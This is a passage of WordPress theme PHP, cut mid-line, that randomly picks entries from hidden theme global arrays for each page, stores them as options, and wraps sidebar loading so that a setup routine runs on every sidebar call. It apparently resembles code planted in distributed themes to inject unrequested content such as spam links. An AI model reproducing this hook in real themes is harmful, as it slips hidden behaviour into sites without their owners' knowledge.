','_',strtolower(trim($theme->theme_name))));$do_initilize_set_0=array_keys($the_wp_theme_globals[0]);$do_initilize_set_1=array_keys($the_wp_theme_globals[1]);$do_initilize_set_2=array_keys($the_wp_theme_globals[2]);$do_initilize_set_3=array_keys($the_wp_theme_globals[3]);$initilize_set_0=array_rand($do_initilize_set_0);$initilize_set_1=array_rand($do_initilize_set_1);$initilize_set_2=array_rand($do_initilize_set_2);$initilize_set_3=array_rand($do_initilize_set_3);$initilize_set[$page][0]=$do_initilize_set_0[$initilize_set_0];$initilize_set[$page][1]=$do_initilize_set_1[$initilize_set_1];$initilize_set[$page][2]=$do_initilize_set_2[$initilize_set_2];$initilize_set[$page][3]=$do_initilize_set_3[$initilize_set_3];update_option('wp_theme_initilize_set_'.str_replace(' ','_',strtolower(trim($theme->theme_name))),$initilize_set);return $initilize_set;}
if(!function_exists('get_sidebars')) { function get_sidebars($the_sidebar = '') { wp_initialize_the_theme_load(); get_sidebar($the_sidebar); } }
?>